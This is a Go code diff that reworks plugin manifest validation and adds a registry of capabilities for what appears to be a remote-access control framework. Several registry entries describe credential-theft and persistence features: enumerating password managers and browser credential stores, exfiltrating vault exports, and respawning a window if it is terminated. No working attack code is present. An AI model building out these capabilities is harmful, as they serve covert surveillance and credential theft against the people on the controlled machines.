@@ -20,16 +20,17 @@ type Manifest struct {
 	RepositoryURL string            `json:"repositoryUrl"`
 	License       LicenseInfo       `json:"license"`
 	Categories    []string          `json:"categories,omitempty"`
-	Capabilities  []Capability      `json:"capabilities,omitempty"`
+	Capabilities  []string          `json:"capabilities,omitempty"`
 	Requirements  Requirements      `json:"requirements"`
 	Distribution  Distribution      `json:"distribution"`
 	Package       PackageDescriptor `json:"package"`
 }
 
-type Capability struct {
-	Name        string `json:"name"`
-	Module      string `json:"module"`
-	Description string `json:"description,omitempty"`
+type CapabilityMetadata struct {
+	ID          string
+	Module      string
+	Name        string
+	Description string
 }
 
 type Requirements struct {
@@ -120,6 +121,116 @@ var (
 		"system-info":    {},
 		"notes":          {},
 	}
+	registeredCapabilities = map[string]CapabilityMetadata{
+		"remote-desktop.stream": {
+			ID:          "remote-desktop.stream",
+			Module:      "remote-desktop",
+			Name:        "Desktop streaming",
+			Description: "Stream high-fidelity desktop frames to the controller UI.",
+		},
+		"remote-desktop.input": {
+			ID:          "remote-desktop.input",
+			Module:      "remote-desktop",
+			Name:        "Input relay",
+			Description: "Relay keyboard and pointer events back to the remote host.",
+		},
+		"remote-desktop.transport.quic": {
+			ID:          "remote-desktop.transport.quic",
+			Module:      "remote-desktop",
+			Name:        "QUIC transport",
+			Description: "Provide QUIC transport negotiation for resilient input streams.",
+		},
+		"remote-desktop.codec.hevc": {
+			ID:          "remote-desktop.codec.hevc",
+			Module:      "remote-desktop",
+			Name:        "HEVC encoding",
+			Description: "Enable hardware-accelerated HEVC streaming when supported.",
+		},
+		"remote-desktop.metrics": {
+			ID:          "remote-desktop.metrics",
+			Module:      "remote-desktop",
+			Name:        "Performance telemetry",
+			Description: "Collect frame quality and adaptive bitrate metrics for dashboards.",
+		},
+		"audio.capture": {
+			ID:          "audio.capture",
+			Module:      "audio-control",
+			Name:        "Audio capture",
+			Description: "Capture remote system audio for monitoring and recording.",
+		},
+		"audio.inject": {
+			ID:          "audio.inject",
+			Module:      "audio-control",
+			Name:        "Audio injection",
+			Description: "Inject operator-provided audio streams into the remote session.",
+		},
+		"clipboard.capture": {
+			ID:          "clipboard.capture",
+			Module:      "clipboard",
+			Name:        "Clipboard capture",
+			Description: "Capture clipboard changes emitted by the remote workstation.",
+		},
+		"clipboard.push": {
+			ID:          "clipboard.push",
+			Module:      "clipboard",
+			Name:        "Clipboard push",
+			Description: "Push operator clipboard payloads to the remote host.",
+		},
+		"recovery.queue": {
+			ID:          "recovery.queue",
+			Module:      "recovery",
+			Name:        "Recovery queue",
+			Description: "Queue recovery jobs for background execution and monitoring.",
+		},
+		"recovery.collect": {
+			ID:          "recovery.collect",
+			Module:      "recovery",
+			Name:        "Artifact collection",
+			Description: "Collect artifacts staged by upstream modules for exfiltration.",
+		},
+		"vault.export": {
+			ID:          "vault.export",
+			Module:      "recovery",
+			Name:        "Vault export collection",
+			Description: "Stage and exfiltrate vault exports via the recovery pipeline.",
+		},
+		"client-chat.persistent": {
+			ID:          "client-chat.persistent",
+			Module:      "client-chat",
+			Name:        "Persistent window",
+			Description: "Keep the chat interface open continuously and respawn it if terminated.",
+		},
+		"client-chat.alias": {
+			ID:          "client-chat.alias",
+			Module:      "client-chat",
+			Name:        "Alias control",
+			Description: "Allow the controller to update operator and client aliases in real time.",
+		},
+		"system-info.snapshot": {
+			ID:          "system-info.snapshot",
+			Module:      "system-info",
+			Name:        "System snapshot",
+			Description: "Produce structured operating system and hardware inventories.",
+		},
+		"system-info.telemetry": {
+			ID:          "system-info.telemetry",
+			Module:      "system-info",
+			Name:        "System telemetry",
+			Description: "Surface live telemetry metrics used by scheduling and recovery modules.",
+		},
+		"vault.enumerate": {
+			ID:          "vault.enumerate",
+			Module:      "system-info",
+			Name:        "Vault enumeration",
+			Description: "Enumerate installed password managers and browser credential stores.",
+		},
+		"notes.sync": {
+			ID:          "notes.sync",
+			Module:      "notes",
+			Name:        "Notes sync",
+			Description: "Synchronize local incident notes to the operator vault with delta compression.",
+		},
+	}
 )
 
 type InstallationTelemetry struct {
@@ -208,16 +319,22 @@ func (m Manifest) Validate() error {
 		}
 	}
 
-	for index, capability := range m.Capabilities {
-		if strings.TrimSpace(capability.Name) == "" {
-			problems = append(problems, fmt.Errorf("capability %d is missing name", index))
-		}
-		if strings.TrimSpace(capability.Module) == "" {
-			problems = append(problems, fmt.Errorf("capability %s is missing module reference", capability.Name))
+	for index, capabilityID := range m.Capabilities {
+		trimmed := strings.TrimSpace(capabilityID)
+		if trimmed == "" {
+			problems = append(problems, fmt.Errorf("capability %d is empty", index))
 			continue
 		}
-		if _, ok := registeredModules[capability.Module]; !ok {
-			problems = append(problems, fmt.Errorf("capability %s references unknown module %s", capability.Name, capability.Module))
+		descriptor, ok := LookupCapability(trimmed)
+		if !ok {
+			problems = append(problems, fmt.Errorf("capability %s is not registered", trimmed))
+			continue
+		}
+		if descriptor.Module == "" {
+			continue
+		}
+		if _, ok := registeredModules[descriptor.Module]; !ok {
+			problems = append(problems, fmt.Errorf("capability %s references unknown module %s", descriptor.ID, descriptor.Module))
 		}
 	}
 
@@ -295,6 +412,21 @@ func (m Manifest) validateLicense() error {
 		}
 	}
 	return nil
+}
+
+func LookupCapability(id string) (CapabilityMetadata, bool) {
+	trimmed := strings.TrimSpace(id)
+	if trimmed == "" {
+		return CapabilityMetadata{}, false
+	}
+	if descriptor, ok := registeredCapabilities[trimmed]; ok {
+		return descriptor, true
+	}
+	lowered := strings.ToLower(trimmed)
+	if descriptor, ok := registeredCapabilities[lowered]; ok {
+		return descriptor, true
+	}
+	return CapabilityMetadata{}, false
 }
 
 func validateGitHubRepository(raw string) error {
